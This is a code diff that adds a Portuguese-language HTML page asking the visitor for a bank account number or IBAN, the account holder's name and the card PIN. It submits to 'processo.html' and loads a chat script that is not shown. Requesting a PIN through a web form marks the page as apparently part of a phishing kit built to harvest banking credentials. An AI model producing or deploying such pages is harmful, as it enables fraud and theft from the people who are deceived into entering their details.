@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Detalhes Bancários</title>
+    <link rel="stylesheet" href="styles/chat.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Informe seus Dados Bancários</h1>
+        <form id="bankDetailsForm" action="processo.html">
+            <div class="form-group">
+                <label for="accountNumber">Número da Conta ou IBAN</label>
+                <input type="text" id="accountNumber" name="accountNumber" required>
+            </div>
+            <div class="form-group">
+                <label for="accountName">Nome da Conta</label>
+                <input type="text" id="accountName" name="accountName" required>
+            </div>
+            <div class="form-group">
+                <label for="pin">PIN</label>
+                <input type="password" id="pin" name="pin" required>
+            </div>
+            <a href="processo.html"><button type="submit">Finalizar</button></a>
+        </form>
+        <div id="result"></div>
+    </div>
+    <script src="chat2.js"></script>
+</body>
+</html>
